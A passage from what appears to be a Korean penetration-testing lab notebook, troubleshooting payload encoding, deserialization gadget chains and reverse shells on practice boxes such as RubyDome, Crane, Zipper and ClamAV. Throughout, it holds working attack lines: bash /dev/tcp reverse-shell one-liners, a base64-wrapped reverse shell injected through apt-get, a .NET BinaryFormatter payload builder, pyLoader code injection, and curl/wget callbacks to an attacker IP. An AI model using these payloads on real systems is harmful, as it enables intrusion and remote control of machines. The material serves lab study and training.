| `404 Not Found` | 엔드포인트 경로가 다른 버전 | 인접 경로를 함께 시도(`/flash/add`·`/flash/addcrypted`) |
| `405 Method Not Allowed` | GET 으로 보냄 | POST + `application/x-www-form-urlencoded` |
| `302 → /login` | 예외 목록 밖 경로로 보냄 | 예외는 그 프리픽스뿐이고 나머지는 전부 튕김 |
| 명령은 도는 것 같은데 출력을 못 본다 | 블라인드(응답 본문에 결과가 안 실림) | 리버스셸로 가거나 아웃오브밴드 채널(B-87) |
| 취약 키워드가 안 먹는다 | 이미 패치된 판본 | **같은 진입점의 후속 CVE 를 볼 것** — [[pyLoader]] 는 `pyimport` 가 막혀도 CVE-2024-39205(`dev85` 이하)로 같은 엔드포인트가 다시 뚫림 |

#### A-2-30. 페이로드는 맞는데 200 이 온다 — 내 전송 계층이 이미 디코드했다

**증상** — 공개 PoC 그대로 보냈는데 200 + 정상 응답. 서버는 멀쩡하고 에러도 없음(A-12).

**원인은 타겟이 아니라 «내 클라이언트»일 수 있음.** 페이로드가 퍼센트 인코딩(`%20`·`%60`)에 의존하면, 전송 계층이 그것을 **한 번 더 인코딩하거나 하지 않는 것**이 곧 승패를 가름.

⛔ **먼저 물을 것은 「이 `%XX` 가 «디코드된 바이트»로 도착해야 하는가, «리터럴 문자열»로 도착해야 하는가」임.** 두 요구가 정반대라 같은 플래그가 한쪽에서는 정답이고 다른 쪽에서는 페이로드를 죽임. Kali 실측(2026-08-26, 요청 본문을 `nc` 로 캡처):

| 보낸 것 | 실제 전송 본문 | 서버가 폼 디코드하면 |
|---|---|---|
| `--data-binary 'jk=a%20b'` | `jk=a%20b` | **공백** |
| `-d 'jk=a%20b'`(인라인) | `jk=a%20b` | **공백**(`--data-binary` 와 동일) |
| `--data-urlencode 'jk=a%20b'` | `jk=a%2520b` | **리터럴 `%20`** |
| Python `requests` `data={'jk':'a%20b'}` | `jk=a%2520b` | **리터럴 `%20`** |

- **디코드된 바이트가 필요한 경우** — [[pyLoader]] 의 `jk=pyimport%20os;os.system(…)` 은 `%20` 이 **진짜 공백이 되어야** 파이썬 구문이 성립함 → `--data-binary`. 여기에 `--data-urlencode` 를 쓰면 `%25` 이중 인코딩으로 페이로드가 통째로 죽음
- **리터럴 `%XX` 가 필요한 경우** — [[RubyDome]] PDFKit 0.8.6 의 `url_needs_escaping?` 는 `unescape(@source) == @source` 라 **입력에 `%XX` 가 하나라도 살아 있어야** 이스케이프가 «건너뛰어짐» → `--data-urlencode`. 리터럴 공백이 도착하면 백틱이 `%60` 으로 이스케이프되어 조용히 실패

**[[RubyDome]] 실측 — 리터럴 공백 하나가 익스플로잇을 통째로 죽였음.** 첫 시도(`pop.py`, 17:48:10)의 페이로드가 `%20` 이 아니라 **리터럴 공백**이었음:
```python
payload = "http:// `%s`" % rb
```
— 출처: `~/PG/RubyDome/pop.py`. 0.8.6 `Source` 를 직접 호출해 재현:
```text
"http:// `id`"        ->  "http://%20%60id%60"
"http://x/?a=%20`id`" ->  "http://x/?a=%20`id`"
```
첫 줄 결과가 그 세션에 저장된 에러 응답의 명령행과 **바이트 단위로 일치**함(`~/PG/RubyDome/err.html`) — 실패가 실측으로 남아 있었던 것임.

⚠️ **`+` 는 폼 인코딩에서 공백임.** base64 를 raw 로 실어 보내면(`-d`·`--data-binary`) 서버가 `+` 를 공백으로 풀어 `base64 -d` 가 "invalid input" 을 뱉거나 조용히 쓰레기를 만듦. 반면 `--data-urlencode`·requests 는 `+` 를 `%2B` 로 감싸므로 이 문제가 없음(위 실측에서 `p=a%2Bb` 확인).
⚠️ **`-d` 와 `--data-binary` 는 인라인 문자열에서는 같으나 `@파일` 입력에서 갈림** — `-d @f` 는 **개행을 제거**하고(`a=1b=2`) `--data-binary @f` 는 보존함(`a=1\nb=2`). 페이로드를 파일로 빼는 순간 `-d` 가 깨지므로 **습관을 `--data-binary` 로 고정하는 편이 안전함.**

**보험 셋:**
1. **주입 성립은 리버스셸이 아니라 `sleep` 으로 먼저 확인.** `` %20`sleep 10` `` 를 넣고 응답이 10초 느려지는지 봄 — 아웃바운드·셸 존재·인코딩과 무관하게 「명령이 실행된다」만 분리 판정됨
2. **오라클 문자열을 정해두고 응답을 자동 분류.** [[RubyDome]] 은 `test.py`(17:48:40)가 그 역할을 했음 — 렌더러가 가짜 URL 에서 실패하며 뱉는 `ImproperWkhtmltopdfExitStatus` 가 **「주입은 도달했다」의 신호**이고, `application/pdf` 가 돌아오면 **주입 실패**임:
   ```python
   if "ImproperWkhtmltopdfExitStatus" in r.text: print("-> Improper exit status")
   elif r.headers.get("Content-Type","").startswith("application/pdf"): print("-> PDF returned")
   ```
   — 출처: `~/PG/RubyDome/test.py`
3. **페이로드가 서버에 «어떤 모습으로» 도착했는지 에러 페이지에서 직접 확인.** 디버그 모드면 조립된 명령행이 그대로 실림(A-12).

#### A-2-31. 인스톨러 잔존물은 대개 함정이다 — 5분 상한

**증상** — 웹루트에 `install.log`·`install.php`·`installer/` 가 그대로 서빙됨. 「여기가 길」로 보임.

**실측 — [[Crane]].** `/install.log` 가 51295바이트 설치 로그 전문을 뱉었음. 안에 있던 것:

| 조사한 것 | 결과 |
|---|---|
| `/install.log`(51KB 전량 확인) | 설치일 2023-08-24, DB 드라이버·XML 파서·ZIP 지원 부재 ERROR 와 설치 진행 로그뿐. `password` 문자열이 44행 등장하나 **전부 「The provided database host, username, and/or password is invalid」 한 문구의 반복이고 값은 없음** |
| `/install.php` | `installer_locked => true` — 재설치 불가 `[가정 — 산출물 미보존]` |
| `/config.php`·`/config_override.php` | 0바이트. PHP 가 정상 파싱함, 유출 없음 `[가정 — 산출물 미보존]` |

설치 로그 노출은 실무 침투 테스트에서는 보고 가치가 있는 정보 노출이지만 **피벗 대상은 아니었음.** 정답은 이미 손에 있던 버전 정보였음.

**손절 기준을 미리 정해 둘 것** — 인스톨러 계열은 잠금 플래그를 **한 번만** 확인하고 잠겨 있으면 **5분 안에 접을 것.**

| 제품 | 잠금 지표 |
|---|---|
| SuiteCRM · SugarCRM | `installer_locked` |
| Nextcloud | `installed.lock` |
| WordPress | `wp-config.php` 존재 여부 |

**일반화** — 인스톨러 잔존물·설치 로그·디렉터리 리스팅·내부 IP 누출은 **정보 노출 보고서 항목이지 반드시 익스플로잇 경로는 아님.** 열려 보이는 것과 길은 다름.
→ 방어 쪽 — 설치 완료 후 인스톨러 산출물(`install.log`·`install/`)을 삭제하거나 웹루트 밖으로 옮기고, 웹서버 레벨에서 `.log` 확장자를 거부 규칙으로 차단할 것.

**PHP 앱이면 대신 이쪽을 찌를 것** — `config.php`·`config.inc.php`·`.env`·`config.php.bak`·`config.php~`. `.bak`/`~`/`.old` 확장자는 PHP 로 파싱되지 않아 평문으로 떨어짐(그래서 feroxbuster `-x` 에 `bak` 을 넣음).
⚠️ **`config.php` 가 0바이트로 오는 것은 정상이자 나쁜 신호임** — 서버가 정상 파싱했다는 뜻. 여기서 **평문이 보였다면 PHP 핸들러가 죽은 것**이고 그게 곧 DB 자격증명 유출임(A-2-16).

#### A-2-32. 역직렬화 가젯 체인이 «에러 없이» 죽는다

**증상** — 페이로드를 보냈는데 아무 일도 안 일어남. **에러 메시지가 없어서** 디버깅이 어려움. 가젯 체인은 터지거나 아무 일도 안 일어나거나 둘 중 하나임.

| 원인 | 대응 |
|---|---|
| 라이브러리 **버전 불일치** — 체인이 특정 버전의 클래스 구조를 전제 | `phpggc -l <라이브러리>` 로 RCE1/RCE2/RCE3… 를 순서대로 전부 시도 |
| 대상 라이브러리가 번들되지 않음 | `vendor/composer/installed.json` 을 읽을 수 있으면 확인. 못 읽으면 Monolog → Guzzle → Symfony 순 |
| `__destruct` 가 예외로 중단 | 다른 체인으로 교체 |
| 페이로드가 길이 필드 불일치로 파싱 실패 | 직렬화 문자열을 손으로 고쳤다면 `s:<길이>` 값을 다시 계산. **한 글자만 틀려도 통째로 무시됨** |
| 플러시 조건 미충족 | `bufferLimit`/`bufferSize` = `-1`, `initialized` = `true`, `level` = `null`. **틀리면 `flush()` 가 조기 반환해 체인이 조용히 죽음**(B-1-44) |

**진단 순서 — 파괴하지 말고 관측부터:**
1. **파싱되는지 확인** — 값을 한 글자 망가뜨려 보냄. 500 이나 다른 에러가 나면 서버가 실제로 역직렬화하고 있다는 증거
2. **체인이 사는지 확인** — RCE 대신 `sleep 10`. 응답이 10초 늦으면 성공
3. **그다음에 셸** — 순서를 지키면 체인 문제와 네트워크 문제를 분리할 수 있음

1번을 건너뛰고 바로 셸을 던지면 안 붙었을 때 원인 후보가 다섯 개로 늘어남. **한 번에 하나씩만 바꿀 것**(A-31).

**출처** — [[Crane]](이 박스에서는 `Monolog/RCE2` 가 한 번에 통했음).


**.NET `BinaryFormatter` 판 — 길이 접두사가 페이로드 안에 «굳어 있음».** [[Algernon]] EDB 49216 은 base64 직렬화 스트림 안의 `X` 1360개를 리버스셸 base64 로 치환함:
```python
psh_shell = psh_shell.encode('utf-16')[2:] # remove BOM
psh_shell = base64.b64encode(psh_shell)
psh_shell = psh_shell.ljust(1360, b' ')
payload = base64.b64decode(payload)
payload = payload.replace(bytes("X"*1360, 'utf-8'), psh_shell)
```
왜 1360인지는 스트림을 뜯으면 나옴:
```text
prefix bytes before /c : b'\x00\x00\xf2\n'
cmdstring: b'/c powershell.exe -encodedCommand XXXXXX'
X count: 1360
len of "/c powershell.exe -encodedCommand ": 34
7bit len decode: 1394
psh chars: 500 / utf16le bytes: 1000 / b64 len: 1336 / after ljust: 1360 pad spaces: 24
```
- `BinaryObjectString` 레코드는 문자열 앞에 **7비트 인코딩 길이 접두사**를 둠. `\xf2\x0a` = `(0xF2 & 0x7F) | (0x0A << 7)` = `114 + 1280` = **1394**
- 실제 문자열은 `"/c powershell.exe -encodedCommand "`(34) + `X` 1360 = **1394**. 정확히 맞음
- **접두사 1394 는 base64 페이로드 안에 굳어 있어** 생성기를 다시 돌리지 않는 한 못 바꿈. 치환 문자열은 반드시 **정확히 1360바이트**
- **짧으면** `ljust(1360, b' ')` 가 공백으로 채워 문제없음. **길면** `ljust` 는 자르지 않으므로 스트림이 밀려 파싱 실패 → **아무 일도 안 일어나고 스크립트는 조용히 정상 종료**
- 이 박스는 여유가 **24바이트**뿐이었음. base64 는 원본 3바이트당 4자로 불어나므로 원라이너에 문자 10여 개만 더 붙어도 초과함

→ PHP `s:<길이>` 판(이미 표에 있음)과 **완전히 같은 실패 모드**임. 언어만 다름.
→ **긴 페이로드가 필요하면 스크립트를 고치지 말고 체인을 새로 생성할 것** — `ysoserial.net` 은 길이 접두사를 생성기가 계산하므로 크기 제약이 없음.

#### A-2-33. 원격 명령 실행에는 항상 절대경로 — CWD 는 «대상 프로세스»의 것이다

**증상** — RCE 는 되는데 `cat etc/passwd` 류가 `No such file or directory` 로 실패함. 내 셸의 작업 디렉터리가 아니라 **명령을 실행하는 원격 프로세스의 CWD** 기준 상대경로가 되기 때문이고, 그 CWD 가 어디인지는 대개 모름.

[[Clue]] `~/.zsh_history` 1072~1076행 원문:
```text
python 47799.py 1921.168.115.240 'cat /etc/passwd'   ← IP 오타 (192 → 1921)
python 47799.py 1921.168.115.240 'cat etc/passwd'    ← IP 오타 + 앞 슬래시 누락
python 47799.py 192.168.115.240 'cat etc/passwd'     ← 앞 슬래시 누락, 실패
python 47799.py 192.168.115.240 'cat /etc/passwd'    ← 절대경로, 성공
```
여기서 실행 주체는 FreeSWITCH 프로세스임. **서버가 돌려준 에러 문구 자체는 기록에 없음**(관측 없음 — 위 순서는 히스토리에서 재구성한 것).
→ **원격 명령은 절대경로로 쓰거나 `pwd` 를 먼저 한 번 실행할 것.** 두 변수(IP·경로)를 동시에 고치면 무엇이 원인이었는지 못 가림(A-31 의 「한 번에 한 변수만」과 같은 규율).

### A-3. 셸

#### A-31. 리버스셸이 안 붙는다

**확인 순서 — 계층부터 분리할 것. 방화벽 의심은 마지막임.**

**0. 서빙 중인 파일이 «내가 생각한 그 파일»인가 — `ls -l` 한 번.** 실측([[Jacko]]): `-o reverse.exe` 를 세 번 쓰며 덮어써서 16:10 에 타겟이 받아간 것이 **meterpreter/4444 판(238,080B)** 인데 리스너는 135·8082 에 `nc` 로 걸려 있었음. 두 겹으로 틀림 — ①포트 불일치 ②`meterpreter_reverse_tcp` 는 붙자마자 메타스플로잇 프로토콜로 말하므로 `nc` 에는 cmd 프롬프트가 안 나옴(`multi/handler` + 같은 페이로드라야 함). **16:10 다운로드 → 17:04 셸 = 54분**이 여기 들어갔고 원인은 방화벽도 AV 도 아니었음.
   - **크기 하나로 즉시 갈림** — meterpreter 수백 KB vs `shell_reverse_tcp` 7~8KB. 어느 페이로드가 어디로 콜백하는지의 확정은 B-88
   - ⛔ **페이로드 파일명에 포트를 박을 것** — `rev-8082.exe`·`rev-443.exe`. 같은 이름을 덮어쓰는 순간 이 54분이 재현됨
   - ⚠️ **리스너 포트를 «타겟이 인바운드로 연 포트»에서 고르지 말 것.** [[Jacko]] 가 고른 8082·135 는 타겟의 열린 포트임 — 신경 쓸 것은 타겟에서 **밖으로 나가는** 방향이라 둘은 무관함. 결과적으로 8082 가 통했으나 근거 있는 선택이 아니었음
   - ⚠️ **페이로드 안의 LHOST 가 «현재» tun0 IP 인가** — VPN 재접속마다 바뀜. 리버스셸이 조용하면 포트를 의심하기 전에 이것부터 봄([[Codo]] 옛 노트의 반사 순서: tun0 IP → 아웃바운드 포트 443·80·53 → 페이로드 미수정)

1. **내 리스너가 살아 있는가.** `ss -lntp` 로 확인. 실측([[Detection]]): 제3 호스트(192.168.248.220)가 Kali 443 리스너를 먼저 물어 `-k` 없는 `nc` 가 첫 연결 후 죽어 있었음 — 방화벽이 아니었음. IP 는 작업 중 `ss` 화면에서 읽은 값으로 `writeup_notes.txt` 에만 남고 raw `ss` 출력은 미보존 [가정]
2. **Kali 쪽 `address already in use`** — 잔존 TIME_WAIT 임. 이것을 원격 방화벽으로 오독해 시간을 태운 전례 있음. **`errno 98` 은 언제나 «로컬»이고, 정답은 포트를 바꾸는 것이 아니라 «같은 포트를 비우고 같은 포트로 재시도»하는 것**([[Wombo]] — 최초 `:80` 이 `OSError(98, 'Address already in use')` 로 죽자 네트워크 실패로 오독해 다른 포트를 헤맸는데 **최종 성공도 `:80`** 이었음. 첫 시도 `exploit_run.log` 11:27:28 → 플래그 `flags.txt` 12:02:31 = **35분**, 대부분이 이 오독에서 파생)
3. **SYN 이 실제로 나가는가.** `tcpdump -i tun0` 로 connect-back 확인
4. **egress 를 계층 분리해 측정할 것.** 명령 실행은 되는데 셸이 안 붙으면 stderr 를 회수해 원인을 봄:
   ```bash
   O=$( (timeout 6 bash -c "echo TEST443 > /dev/tcp/<LHOST>/443") 2>&1 | base64 -w0 ); curl -s http://<LHOST>/diag443-$O
   ```
   빈 base64 = stderr 없음 = 그 포트 아웃바운드 정상
5. 그래도 안 되면 포트 교체 — **443 → 80 → 53**

**원인 후보 하나 더 — 페이로드가 dash 문법으로 실행돼 «파싱 단계»에서 깨짐.** PHP `system()`/`exec()` 류는 `/bin/sh`(Ubuntu·Debian 은 dash)로 실행되는데 리버스셸 원라이너의 `>&`·`0>&1` 은 **bash 전용 문법**임. dash 에서 파싱 자체가 실패해 셸이 안 붙음 — TCP 연결·리스너·아웃바운드가 **전부 정상**이라 원인 파악이 가장 오래 걸리는 실패 유형임. 해법은 `bash -c '...'` 로 감싸 실행 셸을 명시하는 것.
[[Zipper]] — `curl -G --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/.../4444 0>&1'"`. **`c=id` 로 명령 실행 자체를 먼저 확인**해 「웹셸이 죽었다 / 명령이 안 된다 / 네트워크가 막혔다」 3중 원인을 좁혔음 — **한 번에 한 변수만 바꾸는 진단 순서**임.

**웹셸 경유 리버스셸의 증상별 원인표**([[Zipper]]):

| 증상 | 원인 | 확인법 |
|---|---|---|
| 200 인데 아무 일도 안 일어남 | `#` 가 잘려 대상이 미지정(A-2-23) | `c=id` 로 되돌려 웹셸 자체가 사는지 먼저 확인 |
| `c=id` 는 되는데 셸만 안 붙음 | `>&` 가 dash 에서 문법오류 | `bash -c '...'` 로 감쌌는지 확인 |
| 명령이 중간에 끊김 | `&` 를 인코딩 안 함 | `%26` 으로 바꾸거나 `--data-urlencode` 에 위임 |
| 전부 정상인데 연결이 없음 | 아웃바운드 필터 | 443/80/53 으로 포트를 바꿔 재시도 |

⚠️ **인코딩과 셸 종류를 동시에 고치지 말 것** — 무엇이 원인이었는지 모른 채 넘어감.

⚠️ **「80만 허용된다」고 단정하지 말 것 — 그건 `[가정]`임.** tun0 캡처는 *성공한* 회선만 보여줌. 「시도하지 않았다」와 「시도했으나 타겟 egress 에서 막혀 SYN 이 안 왔다」를 캡처만으로 구분 불가. 확실한 것은 성공 회선이 80 이라는 것뿐임([[Wombo]] · [[Bratarina]] 실측, 2026-08-20 재확인).
⚠️ [[Detection]] 에서는 「80만 허용」이 **반증됨** — 443 아웃바운드 정상이었고 원인은 리스너 점유였음.
⚠️ [[Hawat]] 도 같은 오독 후보였음 — 원 노트가 **「아웃바운드가 443만 열려 있다 · 4444 로 리스너를 띄우면 영영 안 붙는다」**고 단정하고 그 근거로 nmap 의 `443/tcp closed` 를 들었음. **`443/tcp closed` 는 «인바운드» 스캔 결과라 아웃바운드 egress 정책의 근거가 아님.** 다른 포트를 시도한 기록이 `~/PG/Hawat/` 에 없어 「4444 는 안 붙는다」도 관측이 아님. **확인된 것은 성공 회선이 tcp/443 이라는 것뿐임**(2026-08-26 소급 감사에서 강등).
→ 일반화: **인바운드 스캔 결과로 egress 를 추론하지 말 것.** 둘은 서로 다른 방향의 정책임.
⚠️ [[ClamAV]] 에서는 egress 가 **80·443·4444 전부 열려 있었음**(80: `http_stager.log`, 443: `listener443.log`, 4444: `shell_session.log` 접속 헤더). 「80만 허용」류로 단정하지 말 것.

**리스너 함정** — `sudo rlwrap nc | tee` 로 감싸면 tmux `capture-pane` 이 **빈 페인**을 반환함(파이프라인이 pty 를 안 거침). tee 로그에는 남음. **리스너를 tee 로 감싸지 말 것**([[Detection]]).

⚠️ **같은 `tee` 함정이 「셸이 죽었다」로도 오독됨 — 판별은 «로그 파일 크기»로 할 것.** [[Flimsy]] 는 리스너를 `sudo rlwrap nc -lvnp 443 2>&1 | tee shell443.log` 로 띄웠고 셸은 붙었는데(`connect to … 60714`) `id` 를 쳐도 화면에 아무것도 안 나왔음:
```text
-rw-rw-r-- 1 kali kali 94 Aug 20 21:26 shell443.log
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.220] 60714
```
94바이트 = nc 배너뿐. **`tee` 가 블록 버퍼링이라 4KB 가 안 차면 아무것도 흘려보내지 않음.** 셸이 죽은 것이 아니라 출력이 갇힌 것임.
- **판별법** — 로그 파일 크기가 배너 크기에서 늘지 않으면 버퍼 문제임. 셸이 죽었으면 nc 가 종료되고 tmux 페인이 프롬프트로 돌아옴
- **조치** — tmux 세션을 **이름으로만** 종료 → `tee` 없이 재기동 → **라우트가 살아 있으니 재트리거만으로 새 셸.** 소요 1분 미만
- **일반화** — 익스플로잇이 지속적 상태(라우트·크론·업로드된 웹셸)를 남기는 종류면 셸을 잃어도 싸게 복구됨. 반대로 원샷 인젝션이면 셸 하나가 곧 진입점 전체임

> [!warning] 인용한 `shell443.log` 는 복원본임
> 원본은 21:52 에 「정리」 중 삭제됐다가 세션 기록의 원문으로 되살린 것임. 인용한 `Aug 20 21:26` 은 **관측 당시의 mtime** 이고 현재 디스크상 mtime 은 **21:55**(복원 시각). 내용은 `wc -c` = 94 로 원본과 같음. 경위는 A-69.

⚠️ **같은 함정을 [[Fikklish]] 에서도 밟았고, 거기에 「포트를 남과 공유했다」가 겹쳤음**(약 6분). 첫 리버스셸 리스너를 `sudo rlwrap nc -lvnp 443 | tee ...` 로 띄웠는데 —
- **다른 세션의 [[PwnLab]] 리스너가 이미 443 을 잡고 있었음.** `ss -lntp` 로 PID 를 특정하니 **1시간 45분째 살아 있는 남의 프로세스**였음. `pkill` 을 쓰면 그쪽 작업까지 죽으므로 **내 PID 만 골라 `kill -9`** 했음(A-33 · 광범위 `pkill` 금지 규율과 같은 뿌리)
- `| tee` 파이프 때문에 nc 출력이 **블록 버퍼링**돼 `capture-pane` 에 아무것도 안 보였음 — **셸은 붙었는데 붙은 줄 몰랐음**

→ **리스너는 파이프 없이 띄우고, 기록이 필요하면 `tmux pipe-pane` 이나 별도 로그를 잡을 것.** 그리고 **리스너를 띄우기 전에 `ss -lntp` 로 그 포트가 비어 있는지 볼 것** — 이 볼트는 박스를 병렬로 돌리므로 포트 충돌이 상시 위험임.

⚠️ [[Fractal]] — 첫 시도(443)에서 connect-back 이 안 옴(`frag/revshell443.html` 0바이트). 방화벽으로 단정하기 전에 egress 를 `/dev/tcp` 배치(443/80/53/8080/4444)로 점검해 **80 으로 붙음**([[Wombo]]·[[Bratarina]] 와 같은 패턴). ⚠️ **Kali 쪽 tcpdump·리스너 화면을 파일로 안 남겼음** — 그래서 「53 도 나간다 / 443 은 막혔다」가 그 노트에서 `[가정]` 으로 남았음. 다음부터는 그 출력도 리다이렉트할 것.

**실패 계층을 나눠 진단할 것.** [[Bratarina]] — OpenSMTPD 인젝션은 세 계층으로 갈림: ①인젝션 성공(SMTP 250) ②명령 실행(ICMP/HTTP 콜백 회신) ③셸 회수(nc connect). 「리버스셸이 안 온다」를 한 덩어리로 보면 어디가 막혔는지 못 짚음. **ping(ICMP 회신)으로 실행을, curl 프로브(HTTP 404 회신)로 아웃바운드를, nc 로 셸 회선을 각각 검증**하는 순서가 정답.

**다운로더와 리스너가 같은 포트를 물어야 하면 Kali 쪽 시분할이 필요.** [[Bratarina]] — 아웃바운드가 사실상 80 하나뿐이라 스크립트 fetch(`http.server`)와 리버스셸 리스너(`nc`)가 같은 80 을 놓고 경합함. `http.server` 로 스크립트를 먼저 내려보내고 그 프로세스를 내린 뒤 80 을 nc 리스너로 교체. `tcpdump_callback.log` 의 SYN 타임스탬프로 시분할이 실물로 찍힘 — `13:00:52` GET `/x`(http.server) → `13:01:47` 리버스셸 접속(nc), **55초 간격**. [가정] 이 55초의 정확한 사연(재인젝션인지 OpenSMTPD 큐 재시도인지)은 산출물로 확정 못 함 — 해당 인젝션의 `47984.py` 로그가 남아 있지 않음.

**`setsid … &` 백그라운드 페이로드는 로컬 실행 실패와 egress 차단을 구분하지 못하게 만든다.** [[Cobbles]] — 두 실패가 똑같이 「조용」해서 오진을 유발함. 전환: **출력을 캡처하는 비백그라운드 페이로드**(`1;id>/var/cache/zoneminder/cache/o.txt 2>&1`)로 바꿔 **명령 실행 자체를 먼저 검증**. 이어 egress 계층 점검(`probe.data`: ping + curl 80/53) 후 Kali tcpdump 관측 `try1_icmp.log`·`try2_oob.log` 모두 `0 packets captured`. 최종 리버스셸은 tcp/80 으로 성립.
⚠️ **오독 주의** — `egress*.log` 에 찍힌 `192.168.248.214.80 > 192.168.45.207.xxxxx` 패킷은 connect-back 이 아니라 **curl 요청에 대한 타겟 Apache 응답**(source port 80)임. connect-back 증거는 `try*.log` 의 0-packet 캡처와 최종 80 셸 성립임.
→ 일반화: **진단 단계에서는 전경(foreground)·출력캡처형으로 먼저 실행을 확정**하고, 그 다음 포트를 바꿔가며(443→80→53) egress 를 좁힐 것.

**`tmux kill-session` 은 자식 `sudo nc` 를 못 죽인다 — 좀비가 다음 콜백을 가로챈다.** [[Internal]] — `kill-session` 은 페인의 bash·스크립트를 죽이지만 그 자식인 `sudo nc` 는 detach 되어 계속 리슨함. 이 좀비 nc 가 다음 발사의 콜백을 먹어 새 리스너(stdin feed 가 붙은)가 굶는 사고가 반복됨. 정리는 반드시 **`ss -lntp` 로 PID 를 특정해 그 nc 만 kill**.

**질문은 「아무 데도 안 오는가」가 아니라 「어디로 오는가」임.** 리스너·rogue master 를 **여러 포트로 번갈아 세우고 tcpdump 로 어느 포트에 SYN 이 오는지** 볼 것. [[Wombo]] 는 443·8080·21000 이 전부 무응답이라 「아웃바운드가 통째로 막혔다」로 오판하고 cron·authorized_keys 우회를 파느라 시간을 태웠는데, 성공 회선은 tcp/80 하나였음(`verify_run.log` 의 `SERVER 192.168.45.207:80` → `Loading module...`). [[Hawat]] 는 443 이 성공 회선.

⛔ **출력이 돌아올 콘솔이 없는 경로(시작 메뉴 주입·크론·웹셸)에서는 포트를 하나씩 찍지 말 것 — 실패가 어느 계층인지 못 가림.** [[Mice]] 가 먼저 한 것이 이것이었고 아무것도 판정되지 않았음(`shell53.log` 22:28:34 · `shell4444.log` 22:28:39 · `shell8080.log` 22:28:46 — 셋 다 `listening on [any] <포트> ...` 한 줄로 끝).
→ **타겟에서 여러 포트로 아웃바운드를 시도하고 결과를 Kali HTTP 서버의 «URL 경로»로 회신시킬 것.** 404 여도 상관없음 — 요청이 도착했다는 사실만 필요함. 덤으로 Defender 실시간 보호 상태 같은 것도 같은 요청에 실림. 실측(`~/PG/Mice/http.log` 22:29:35~38):
```text
192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /who_divine_REMOTE-PC HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /OPEN_443 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /BLOCK_53 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:36] "GET /OPEN_80 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:36] "GET /BLOCK_4444 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:37] "GET /BLOCK_8080 HTTP/1.1" 404 -
192.168.248.199 - - [20/Aug/2026 22:29:38] "GET /RTP_True HTTP/1.1" 404 -
```
**egress 가 열려 있는데도 콜백이 없으면 남은 후보는 AV/AMSI 와 페이로드 문법임**(A-35).

**애초에 RCE 확인은 리버스셸이 아니라 ICMP 로 먼저 할 것.** 리버스셸을 바로 던지면 「실행 실패」와 「아웃바운드 차단」이 구별되지 않음 — `ping` 한 줄이면 두 층이 분리됨(위 4번의 계층 분리와 같은 취지).
부수 이득 — **페이로드가 몇 번 실행되는지도 같이 보임.** [[Fikklish]]: `ping -c 3` 페이로드를 **한 번** 실행시켰는데 `tcpdump` 에 ICMP id 가 1·2 로 **각각 seq 1~3 씩, 즉 두 번 완주**했음(ping 프로세스가 둘 떴다는 뜻). `[가정]` 원인은 Weblate 가 컴포넌트 검증 중 hg 를 두 번 호출하는 것으로 보이나 **호출 횟수를 직접 센 기록은 없음.**
→ 실무 함의: **페이로드가 여러 번 실행될 수 있으므로 리버스셸 전에 ICMP 로 「실행되는가」와 「몇 번 실행되는가」를 먼저 확인할 것.**

**「콜백이 없다」와 「명령이 안 돈다」는 완전히 다른 문제인데 증상이 똑같음.** [[Outdated]] — 인증 후 RCE(CVE-2022-36446) 발화 조건을 다 맞춘 뒤 첫 페이로드가 `bash -i >& /dev/tcp/192.168.45.207/443 0>&1` 리버스셸이었음. 응답은 200 이고 apt 출력에 주입 명령이 그대로 찍혔는데도 nc 리스너에 아무것도 안 옴. tcpdump 로도 connect-back 이 안 보여 **아웃바운드 필터로 판단**(그 tcpdump 출력은 파일로 안 남김 — 판정 근거는 `resp2.html` 의 명령 반향과 빈 리스너까지임 `[가정]`).
```html
<tt>apt-get -y  install ;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDMgMD4mMQ==|base64 -d|bash;</tt>
```
— 출처: `~/PG/Outdated/resp2.html`
→ **둘을 분리하는 가장 싼 방법은 네트워크를 안 쓰는 마커를 «먼저» 쏘는 것**(`id > /tmp/x` 를 base64 로 감싼 것). 이 박스는 순서가 반대였음 — 발화 조건 문제를 먼저 풀고 나서야 네트워크 문제가 드러남.
→ **리버스셸에 매달리지 않고 이미 쥔 SSH 세션 + SUID 드롭으로 우회**함. 결과적으로 웹셸 플래그 0점 규정도 함께 피한 경로임(E 절).

**메일 큐에 남은 «옛» 명령이 리스너를 먼저 먹을 수 있음 — MTA 인젝션 계열 고유의 함정.** [[ClamAV]]:
- 443 아웃바운드 확인용으로 `wget http://192.168.45.207:443/p443` 을 한 번 보냈고(try5), 443 리스너에 요청이 실제로 도착함:
```text
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.42] 32803
GET /p443 HTTP/1.0
User-Agent: Wget/1.9.1
Host: 192.168.45.207:443
Accept: */*
Connection: Keep-Alive
```
— 출처: `~/PG/ClamAV/listener443.log`
- 그런데 그 확인용 wget 이 끝나지 않고 **큐에 남았음.** 이후 perl→443 리버스셸을 세 번(try9·try10·try12) 보냈으나 3회 전부 콜백 없음. 원격 `killall wget`(try11)도 소용없었음
- 셸에서 확인하니 큐 3건 + wget 프로세스 생존:
```text
---QUEUE---
total 20
drwxr-s---  2 smmta smmsp 4096 Aug 20 05:39 .
drwxr-xr-x  7 root  root  4096 Jan 21  2009 ..
-rw-r-----  1 root  smmsp   69 Aug 20 05:26 df67K9Q1G9004135
-rw-r-----  1 root  smmsp   69 Aug 20 05:29 df67K9Spbp004144
-rw-r-----  1 root  smmsp   69 Aug 20 05:29 df67K9TFC6004151
---PS---
4
```
— 출처: `~/PG/ClamAV/shell_session.log`
- **해결은 포트 교체였음.** `p.sh`(443)와 `q.sh`(4444)는 포트 문자열 한 조각만 다르고 나머지 바이트가 같은데, 4444 로 바꾸니 한 번에 붙음(`try14.log` → `shell_session.log`)

